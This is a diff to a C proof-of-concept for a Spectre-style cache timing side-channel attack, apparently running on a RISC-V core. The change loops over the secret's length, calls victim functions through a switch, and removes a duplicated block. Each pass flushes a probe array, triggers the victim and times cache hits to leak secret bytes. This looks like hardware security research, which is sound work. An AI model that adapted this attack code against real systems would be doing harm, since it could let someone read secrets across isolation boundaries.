@@ -133,7 +133,7 @@ int main(void){
     *outputAddr = '=';
     *outputAddr = '\n';
 
-	//for(uint32_t len = 0; len < (SECRET_LENGTH); len++){
+	for(uint32_t len = 0; len < (SECRET_LENGTH); len++){
 	
 		// Clear results for every character.
 		for(uint32_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
@@ -148,8 +148,26 @@ int main(void){
 			flushCache((uint32_t)probeArray, sizeof(probeArray));
 
 			victimFuncInit(attackIdx);
-			victimFunc_00(attackIdx);
-			//victimFunc[len](attackIdx);
+			
+			switch (len) {
+				case 0:
+					victimFunc_00(attackIdx);
+					break;
+				case 1:
+					victimFunc_01(attackIdx);
+					break;
+				case 2:
+					victimFunc_02(attackIdx);
+					break;
+				case 3:
+					victimFunc_03(attackIdx);
+					break;
+				case 4:
+					victimFunc_04(attackIdx);
+					break;
+				default:
+					break;
+			}
 
 			// Read out probeArray and see the hit secret value.
 			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
@@ -173,8 +191,6 @@ int main(void){
 		results[0] ^= dummy;
 		topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);
 
-//	char x = (char)output[0]+'0';
-
 		*outputAddr = 'V';
     	*outputAddr = 'a';
     	*outputAddr = 'l';
@@ -195,71 +211,7 @@ int main(void){
 
 		attackIdx++;
 
-	//}
-
-	//for(uint32_t len = 0; len < (SECRET_LENGTH); len++){
-	
-		// Clear results every round.
-		for(uint32_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
-			results[cIdx] = 0;
-		}
-
-		// Run the attack on the same idx for ATTACK_ROUNDS times.
-		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
-
-			// Make sure array you read from is not in the cache.
-//			flushCache(tempStringIndex, sizeof(tempStringIndex));
-			flushCache((uint32_t)probeArray, sizeof(probeArray));
-
-			victimFuncInit(attackIdx);
-			victimFunc_01(attackIdx);
-			//victimFunc[len](attackIdx);
-
-			// Read out probeArray and see the hit secret value.
-			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
-			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
-				mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
-				start = READ_CSR(mcycle);
-				//There should be nothing between these 2 rows, otherwise you need to adjust the threshold. 
-				dummy &= probeArray[mixed_i * ARRAY_STRIDE];
-				diff = (READ_CSR(mcycle) - start);
-
-				// Condition: interval of time is smaller than the threshold.
-				if ((uint32_t)diff < CACHE_HIT_THRESHOLD){
-					results[mixed_i]++; /* Cache hit */
-				}
-			}
-		}
-
-		/* Use junk so above 'dummy=' row won't get optimized out. Order of the following insturctions seems to be in a fixed position. */
-		/* results[0] of static array results() will always be translated into a NULL control character in ASCII or Unicode, so don't worry. */
-		/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
-		results[0] ^= dummy;
-		topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);
-
-//	char x = (char)output[0]+'0';
-
-		*outputAddr = 'V';
-    	*outputAddr = 'a';
-    	*outputAddr = 'l';
-    	*outputAddr = 'u';
-    	*outputAddr = 'e';
-    	*outputAddr = ':';
-    	*outputAddr = ' ';
-    	*outputAddr = (char)output[0];// + '0';//
-	//	*outputAddr = x;//output[0];
-        *outputAddr = ' ';
-        *outputAddr = 'H';
-        *outputAddr = 'i';
-        *outputAddr = 't';
-        *outputAddr = ':';
-        *outputAddr = ' ';
-        *outputAddr = (char)hitArray[0] + '0';
-        *outputAddr = '\n';
-
-		attackIdx++;
-
-	//}
+	}
 
     *outputAddr = '=';
     *outputAddr = '=';
